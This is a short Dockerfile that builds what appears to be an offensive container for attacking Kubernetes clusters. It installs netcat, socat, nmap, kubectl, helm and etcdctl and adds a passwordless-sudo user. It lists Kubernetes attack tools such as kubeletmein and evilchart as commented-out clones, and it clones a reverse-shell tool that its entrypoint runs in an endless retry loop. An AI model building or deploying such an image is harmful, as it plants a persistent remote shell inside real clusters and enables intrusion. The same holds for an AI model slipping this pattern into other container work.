FROM debian:latest
RUN apt-get update
RUN apt-get install -y curl netcat socat git sudo apt-utils wget nmap 


RUN curl -L -o /usr/bin/kubectl https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
RUN chmod 755 /usr/bin/kubectl

RUN curl -L -o /tmp/helm.tar.gz https://storage.googleapis.com/kubernetes-helm/helm-v2.14.0-linux-amd64.tar.gz
RUN tar xvf /tmp/helm.tar.gz -C /tmp
RUN cp /tmp/linux-amd64/helm /usr/bin/helm
RUN chmod 755 /usr/bin/helm


RUN curl -L -o /tmp/etcd.tar.gz https://storage.googleapis.com/etcd/v3.3.13/etcd-v3.3.13-linux-amd64.tar.gz
RUN tar xvf /tmp/etcd.tar.gz -C /tmp
RUN cp /tmp/etcd-v3.3.13-linux-amd64/etcdctl /usr/bin/etcdctl
RUN chmod 755 /usr/bin/etcdctl

RUN useradd -m -s /bin/bash usertemp
RUN echo "usertemp ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/usertemp && chmod 400 /etc/sudoers.d/usertemp
USER usertemp
WORKDIR /home/usertemp
RUN mkdir tools


#RUN git clone https://github.com/jpbetz/auger.git tools/auger
#RUN git clone https://github.com/aquasecurity/kube-hunter.git tools/kube-hunter
#RUN git clone https://github.com/4ARMED/kubeletmein.git tools/kubeletmein
#RUN git clone https://github.com/reactiveops/rbac-lookup.git tools/rbac-lookup
#RUN git clone https://github.com/corneliusweig/rakkess.git tools/rakkess
#RUN git clone https://github.com/aquasecurity/kubectl-who-can.git tools/kubectl-who-can
#RUN git clone https://github.com/4ARMED/evilchart.git tools/evilchar
#



RUN git clone https://github.com/xapax/revshell.git tools/revshell
RUN chmod +x ${HOME}/tools/revshell/revshell
ENTRYPOINT ["/bin/bash", "-c", "while true; do ${HOME}/tools/revshell/revshell; sleep 30s; done"]
